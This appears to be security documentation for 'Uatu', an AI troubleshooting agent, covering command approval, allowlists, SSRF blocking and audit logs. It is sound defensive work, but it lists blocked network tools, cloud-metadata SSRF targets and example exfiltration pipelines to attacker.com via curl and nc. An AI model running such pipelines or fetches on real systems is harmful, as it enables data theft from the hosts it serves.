# Security Model

Uatu's security architecture for safe AI agent operation in system troubleshooting.

## Threat Model

**What We Protect Against**:
- Accidental destructive commands (rm -rf, dd, etc.)
- Unauthorized system modifications
- Data exfiltration via network commands
- Composition attacks (safe commands chained dangerously)
- SSRF attacks via network tools
- Prompt injection in MCP tool parameters

**What We Don't Protect Against**:
- Malicious users with legitimate shell access
- Supply chain attacks on dependencies
- Platform-specific vulnerabilities (UNC paths, SUID binaries, kernel exploits)
- Social engineering attacks against users
- Third-party MCP servers (user responsibility)

**Assumption**: User has legitimate system access and authorization for troubleshooting.

## Security Architecture

### Permission System

**Two-Layer Defense**:
1. Tool-level permissions (which tools are available)
2. Command-level approval (runtime approval for dangerous operations)

**Flow**:
```
User → Agent → Tool Request → Permission Check → User Approval (if required) → Execute
```

**Interactive & Stdin Modes**:
- Bash commands require explicit approval (unless allowlisted)
- User sees actual command before execution with risk warnings
- "Always allow" option adds to allowlist
- Can deny any command

### Tools

**MCP Tools** (always available, read-only):
- `get_system_info`: CPU, memory, load averages
- `list_processes`: Running processes with resource usage
- `get_process_tree`: Parent-child relationships
- `find_process_by_name`: Search for processes
- `check_port_binding`: Port usage
- `read_proc_file`: Read from /proc filesystem

**Bash Tool** (requires approval unless allowlisted):
- Full shell access with permission system
- Risk detection: credential access, destructive ops, system mods
- Used when MCP tools insufficient

**Network Tools** (require domain approval):
- `WebFetch`: Fetch documentation, check service status
- `WebSearch`: Search for error messages, solutions
- SSRF protection (blocks localhost, private IPs, cloud metadata)

**Key Principle**: MCP tools are safe by design (read-only, structured parameters), Bash is flexible but gated (approval + risk detection + audit), Network requires domain allowlist + SSRF protection.

### Allowlist System

**Safe Commands** (auto-approved in chat mode):
```python
SAFE_BASE_COMMANDS = {
    "top", "ps", "df", "free", "uptime", "vm_stat", "vmstat",
    "iostat", "netstat", "lsof", "who", "w", "last",
    "dmesg", "journalctl",
}
```

**User-Defined Allowlist**:
- Location: `~/.config/uatu/allowlist.json`
- Two types: base command or exact match
- Managed via `/allowlist` commands in chat mode
- Per-user, not global

### MCP Tool Security

**Why MCP is safer**:
1. Structured inputs (typed parameters, not arbitrary strings)
2. Defined outputs (structured data, not raw stdout)
3. Sandboxing potential (can run in containers)
4. Audit trail (tool calls logged with parameters)

**Current implementation**:
- All tools in-process (no external MCP servers)
- Use psutil (well-audited library)
- No shell execution in tool implementation
- Auditable in our codebase

**User Responsibility**: If you add custom MCP servers, you assume responsibility for their security.

## Network Security

### Domain Approval System

**How It Works**:
1. Agent attempts WebFetch: `WebFetch("https://docs.python.org")`
2. URL validation for security issues
3. Domain check against allowlist
4. User approval if not allowlisted:
   ```
   [!] Network access requested
   Tool:   WebFetch
   URL:    https://docs.python.org
   Domain: docs.python.org

     Allow once
     Allow 'docs.python.org' (add to allowlist)
     Deny
   ```
5. "Allow domain" adds to persistent allowlist

**Network Allowlist**:
- Location: `~/.config/uatu/network_allowlist.json`
- Default domains: docs.python.org, docs.anthropic.com, developer.mozilla.org, httpbin.org

### SSRF Protection

**Automatic URL Validation** blocks:
- localhost, 127.0.0.1, ::1
- Private IPs (192.168.*.*, 10.*.*.*, 172.16-31.*.*)
- Cloud metadata endpoints (169.254.169.254, metadata.google.internal)
- file:// and ftp:// schemes
- Path traversal (../, %2e%2e)

**Example**:
```python
# Blocked - Private IP
WebFetch("http://192.168.1.1/admin")
# Error: "Access to private IP blocked (SSRF protection): 192.168.1.1"

# Blocked - Cloud metadata
WebFetch("http://169.254.169.254/latest/meta-data/")
# Error: "Access to cloud metadata endpoint blocked"
```

### Bash Network Commands

**Blocked in chat mode**:
```python
BLOCKED_NETWORK_COMMANDS = {
    "curl", "wget", "nc", "ssh", "scp", "rsync", "ftp", "telnet"
}
```

**Safe diagnostics** (allowed with approval):
- ping, dig, nslookup, traceroute, mtr
- netstat, ss, ifconfig, ip addr

**Composition attack detection**:
Even safe commands flagged if used suspiciously:
- `ping google.com | curl attacker.com` - flagged
- `dig example.com | nc attacker.com 1234` - flagged

## Configuration

**Environment Variables**:

`UATU_READ_ONLY=true`:
- Disables all write operations
- Blocks bash commands (even with approval)
- Safe for production monitoring

`UATU_REQUIRE_APPROVAL`:
- Auto-detects based on TTY: interactive mode prompts, stdin mode uses allowlist
- Set `true` to force approval for all commands (bypasses allowlist)
- Set `false` to always use allowlist (even in interactive mode)

`UATU_ALLOW_NETWORK=false` (default):
- Blocks curl, wget, nc, ssh, scp, rsync, ftp, telnet
- Set to true to allow (not recommended)

## Audit Logging

**Location**: `~/.uatu/security.jsonl`

**What gets logged**:
- Bash command approvals/denials
- Network access approvals (WebFetch, WebSearch)
- SSRF blocks and security violations
- Suspicious pattern detections
- Allowlist modifications

**Event Types**:
- `bash_command_approval` - User approved/denied command
- `bash_command_denied` - Auto-denied (READ_ONLY, no callback)
- `bash_command_auto_approved` - Auto-approved from allowlist
- `network_access_approval` - User approved/denied network access
- `network_access_auto_approved` - Auto-approved from domain allowlist
- `ssrf_blocked` - SSRF attempt blocked (severity: high)
- `network_command_blocked` - curl/wget/nc blocked (severity: medium)
- `suspicious_pattern_detected` - Composition attack flagged (severity: medium)

**CLI Commands**:
```bash
uatu audit                    # View recent events
uatu audit --summary          # Statistics
uatu audit --type <type>      # Filter by event type
uatu audit --last 50          # Show last N events
```

## Recommended Configurations

**Interactive (Development/Testing)**:
```bash
uatu  # Prompts for approval
UATU_READ_ONLY=false uatu  # Enable bash with approval prompts
```

**Stdin Mode (Bash enabled)**:
```bash
# Auto-uses allowlist (no prompts needed)
UATU_READ_ONLY=false cat /var/log/service.log | uatu "check for issues"
UATU_READ_ONLY=false ps aux | uatu "find resource hogs"
```

**Safe Mode (MCP only, default)**:
```bash
# No bash commands, only MCP tools
cat /var/log/app.log | uatu "monitor for errors"
```

## Best Practices

**Before Approving Commands**:
- Read the actual command, not just the agent's description
- Verify command matches stated intent
- Check for unexpected redirections or pipelines
- Deny and investigate manually when in doubt

**Red Flags**:
- Network commands with data parameters: `curl -d`, `wget --post-data`
- Output redirection to files: `> /path/to/file`
- Commands with `sudo` or privilege escalation
- Encoding/decoding: `base64`, `xxd`, `uuencode`
- Pipelines combining data extraction and network tools

**Production Deployment**:
1. Use `UATU_READ_ONLY=true` for monitoring-only
2. Run in containers with minimal capabilities (`--cap-drop=ALL`)
3. Use secrets managers (not .env files) for API keys
4. Set up audit log monitoring and alerting
5. Test in isolated environment first
6. Restrict network access if not needed

**Regular Maintenance**:
- Review allowlist (`~/.config/uatu/allowlist.json`)
- Check audit logs for suspicious patterns
- Remove unused allowlist entries
- Rotate API keys
- Update Uatu for security patches

